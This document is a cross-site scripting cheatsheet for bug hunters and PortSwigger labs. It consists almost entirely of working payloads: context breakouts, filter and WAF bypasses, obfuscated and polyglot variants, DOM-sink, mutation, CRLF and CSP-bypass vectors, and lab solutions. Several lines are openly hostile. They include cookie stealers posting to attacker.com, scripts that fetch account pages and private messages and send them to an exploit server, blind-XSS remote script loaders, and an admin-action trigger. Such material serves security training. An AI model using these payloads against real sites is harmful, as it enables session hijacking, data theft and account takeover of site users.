# Advanced XSS Cheatsheet: Unique & Effective Payloads for Bug Hunters

## Quick Reference Payloads by Context

### HTML Context (Between Tags)
```javascript
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<div id="x" tabindex="1" onfocus="alert(document.domain)"></div><script>document.getElementById('x').focus()</script>
```
*Pro tip: Use lesser-known event handlers like `onpageshow` to bypass WAFs that only block common ones like `onload`.*

### HTML Attribute Context
```javascript
" autofocus onfocus=alert(document.domain) "
" onfocus=alert(document.domain) autofocus x="
"><img src=x onerror=alert(document.domain)><"
"onmouseover="alert(document.domain)"
```
*Pro tip: Combining attributes like `autofocus` with event handlers creates self-executing payloads without user interaction.*

### JavaScript Variable Context
```javascript
// For: var input = "USER-INPUT";
";alert(document.domain);//
\";alert(document.domain);//
'-alert(document.domain)-'
</script><img src=x onerror=alert(document.domain)>
${alert(document.domain)}    // For template literals
```
*Pro tip: Always try to break out of the current context first, then execute your payload.*

### URL Parameter Context
```javascript
javascript:alert(document.domain)
javascript:alert`document.domain`
javascript:confirm(document.domain)
data:text/html,<img src=x onerror=alert(document.domain)>
```
*Pro tip: JavaScript protocol handlers often bypass filters that look for script tags.*

## Tricky Filter Bypasses

### Bypassing WAF & Filters

#### No Parentheses
```javascript
<svg onload=alert`document.domain`>
<svg onload=alert&#x60;document.domain&#x60;>
<svg onload="alert.call(null,document.domain)">
<svg onload=window['alert'](document.domain)>
```
*Why it works: Template literals and property access eliminate need for parentheses.*

#### No Spaces
```javascript
<svg/onload=alert(document.domain)>
<svg/onload=alert&#40;document.domain&#41;>
<svg onload=alert(document.domain)//
<svg/onload=alert`document.domain`>
```
*Why it works: Forward slashes, HTML encoding, or comments can replace spaces.*

#### No Alert Keyword
```javascript
<svg onload=confirm(document.domain)>
<svg onload=prompt(document.domain)>
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
<svg onload=eval('\\u0061lert(document.domain)')>
```
*Why it works: Uses alternative dialog functions or encoding to bypass keyword filters.*

#### Obfuscation Techniques
```javascript
<svg onload=\u0061\u006C\u0065\u0072\u0074(document.domain)>
<svg onload=setTimeout('al'+'ert(document.domain)')>
<svg onload=[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\144\157\143\165\155\145\156\164\56\144\157\155\141\151\156\51')()>
```
*Why it works: Unicode escapes and string concatenation bypass string-based filters.*

## DOM XSS Payload Examples

### Location-Based DOM XSS
```javascript
// Exploit location.search
/?search=<img src=x onerror=alert(document.domain)>

// Exploit location.hash
/#<img src=x onerror=alert(document.domain)>

// Exploit document.referrer
// Visit malicious page first that refers to target
<script>location="https://victim.com/?ref="+encodeURIComponent("<img src=x onerror=alert(document.domain)>")</script>
```
*Pro tip: Always check for parameters reflected in the DOM, especially URL fragments which may bypass server filters.*

### DOM Sink Exploits
```javascript
// For innerHTML sink
#"><img src=x onerror=alert(document.domain)>

// For document.write sink
#<script>alert(document.domain)</script>

// For jQuery $(..)'s sink
#<img src=x onerror=alert(document.domain)>

// For eval() sink
#';alert(document.domain)//
```
*Pro tip: Different sinks require different payload structures - adapt to the context.*

## PortSwigger Lab-Specific Payloads

### Admin Panel Action Triggers
```javascript
<script>
fetch('/admin/delete?username=carlos', {
  credentials: 'include'
})
</script>
```
*Why it works: Forces admin user to perform actions while logged in using credentials inclusion.*

### Exfiltration Payloads
```javascript
<script>
fetch('/my-account')
.then(r=>r.text())
.then(t=>{
  fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/log?data='+encodeURIComponent(t))
})
</script>
```
*Why it works: Fetches sensitive data and sends it to your exploit server.*

### Angular Sandbox Escape
```javascript
{{constructor.constructor('alert(document.domain)')()}}
{{$on.constructor('alert(document.domain)')()}}
```
*Why it works: Accesses constructor properties to build function objects that execute arbitrary code.*

### iframe-Based Exploits
```javascript
<iframe src="javascript:alert(document.domain)"></iframe>
<iframe srcdoc="<img src=x onerror=alert(parent.document.domain)>"></iframe>
<iframe onload="alert(this.contentWindow.document.cookie)"></iframe>
```
*Why it works: iframes create new browsing contexts that can interact with parent page.*

## Unique & Specialized Payloads

### One-Line Cookie Stealers
```javascript
<script>fetch('https://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>
<img src=x onerror="location='https://attacker.com/log?c='+encodeURIComponent(document.cookie)">
<script>navigator.sendBeacon('https://attacker.com/log',document.cookie)</script>
```
*Why it works: Multiple methods to exfiltrate cookies adapt to different filter scenarios.*

### SVG-Based Advanced Payloads
```javascript
<svg><animate xlink:href=#x attributeName=href values=javascript:alert(document.domain) /><a id=x><text x=20 y=20>Click me</text></a>
<svg><set attributeName=onload value=alert(document.domain) />
<svg><script>/&/-alert(document.domain)</script>
```
*Why it works: SVG offers numerous obscure ways to execute JavaScript that bypass many filters.*

### CSS-Based XSS
```javascript
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(document.domain)"></xss>
<style>*{background-image:url('javascript:alert(document.domain)')}</style>
<xss id=x tabindex=1 style="outline-offset:-5px;"></xss><script>document.getElementById('x').focus()</script>
```
*Why it works: CSS animations and properties can trigger JavaScript execution in specific contexts.*

### Event Handler Chaining
```javascript
<body/onload=eval(location.hash.slice(1))>#alert(document.domain)
<img src=x onerror="eval(atob(this.id))" id="YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==">
<iframe src="data:text/html,<script>parent.alert(document.domain)</script>"></iframe>
```
*Why it works: Chains multiple techniques to create payloads that are harder to detect and filter.*

## Context-Specific Examples for Real-World Hunting

### JSON Response with Wrong Content Type
```javascript
// If server returns JSON with Content-Type: text/html
{"data":"<img src=x onerror=alert(document.domain)>"}
```
*Pro tip: APIs with incorrect content types are goldmines for XSS.*

### Markdown Injection
```markdown
[Click me](javascript:alert(document.domain))
![Image](onerror=alert(document.domain)/)
```
*Pro tip: Many Markdown implementations inadequately sanitize user content.*

### Meta Tag Refresh Injection
```javascript
<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">
```
*Pro tip: Check for inputs that affect HTTP headers or meta tags.*

### Hidden XSS in HTTP Response Headers
```
// Submit in User-Agent header
<script>alert(document.domain)</script>

// If reflected in page
X-XSS-Protection: 0; script-src 'unsafe-inline'; <script>alert(document.domain)</script>
```
*Pro tip: Modifying HTTP headers like User-Agent & Referer can reveal unusual XSS vectors.*

## Advanced Bug Hunting Techniques

### Blind XSS Hunting
```javascript
<script src="https://YOUR-DOMAIN.xss.ht"></script>

// Or more sophisticated:
<script>
fetch('https://YOUR-DOMAIN.xss.ht/c/'+btoa(document.cookie+"|"+document.domain+"|"+document.URL))
</script>
```
*Pro tip: Use services like XSS Hunter or your own server to catch blind XSS vulnerabilities that appear in admin panels.*

### Mutation XSS
```javascript
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(document.domain)&gt;">
```
*Why it works: HTML parsing inconsistencies create XSS when browsers mutate HTML during rendering.*

### CRLF-Based XSS
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
```
*Pro tip: Look for inputs that might be reflected in HTTP response headers.*

### Self-XSS to Stored XSS Escalation
```javascript
// In profile fields that other users can see:
<img src=x id="</script><script>fetch('/api/messages').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))</script>">
```
*Pro tip: Target profile/user settings that are displayed to other users.*

## Security Researcher's Secret Weapons

### Ultimate Polyglot Payload
```javascript
javascript:"/*\"/*`/*' /*</template></textarea></noscript></style></title></script>--></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
```
*Why it works: Designed to break out of nearly any context by covering multiple enclosure types.*

### Dangling Markup Exfiltration
```html
<img src='https://attacker.com/?
```
*Why it works: Forces browser to send everything until next quote to attacker server - brilliant for bypassing CSP.*

### CSP Bypass Collection
```javascript
// Using allowed sources
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>

// Using JSONP endpoints
<script src="https://allowed-domain.com/jsonp?callback=alert(document.domain)"></script>

// Using DOM clobbering
<form id="location"><input name="href" value="javascript:alert(document.domain)"></form>
<a id="link" href="javascript:alert(document.domain)">Click me</a>
```
*Pro tip: Always check CSP policy for weaknesses like allowing unsafe-inline, eval, or script-src from CDNs.*

## PortSwigger Lab Master Keys

### Quick Lab Solvers

For "Reflected XSS into HTML context with most tags and attributes blocked":
```javascript
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(document.domain)&gt;">
```

For "Reflected XSS with event handlers and href attributes blocked":
```javascript
<svg><a><animate attributeName=href values=javascript:alert(document.domain) /><text x=20 y=20>Click me</text></a>
```

For "Reflected XSS with some SVG markup allowed":
```javascript
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```

For "DOM XSS in jQuery":
```javascript
<iframe srcdoc="<img src=1 onerror=parent.alert(document.domain)>">
```

For "DOM XSS in document.write sink using source location.search":
```javascript
?search=<script>alert(document.domain)</script>
```

*Pro tip: Each PortSwigger lab has specific restrictions - carefully identify what's being filtered to choose the right bypass.*
